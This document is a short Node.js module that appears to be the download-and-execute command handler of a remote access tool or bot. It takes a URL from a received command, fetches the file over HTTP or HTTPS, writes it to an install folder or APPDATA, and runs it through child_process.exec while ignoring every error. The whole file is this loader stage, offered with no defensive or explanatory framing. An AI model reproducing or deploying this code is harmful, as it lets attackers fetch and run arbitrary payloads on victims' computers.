const http = require("http");
const https = require("https");
const fs = require("fs");
const { exec } = require("child_process");
const config = require("../config");
const identification = require("../core/identification");

function downloadExecute(command) {
  const fileUrl = command.split(" ")[1];
  const fileName = fileUrl.split("/")[fileUrl.split("/").length - 1];
  const localFile = identification.platform === "win32" ?
    `${config.windowsInstallPath}${fileName}` :
    `${process.env.APPDATA}\\${fileName}`;

  (command.includes("https") ? https : http).get(fileUrl, (response) => {
    const createFile = fs.createWriteStream(localFile);
    response.pipe(createFile);
    createFile.on('finish', () => {
      createFile.close();
      exec(localFile, (error, stdout, stderr) => {
        if (error) {
          return;
        }
        if (stderr) {
          return;
        }
      });
    }).on("error", () => {
      return;
    })
  });
}
module.exports = downloadExecute
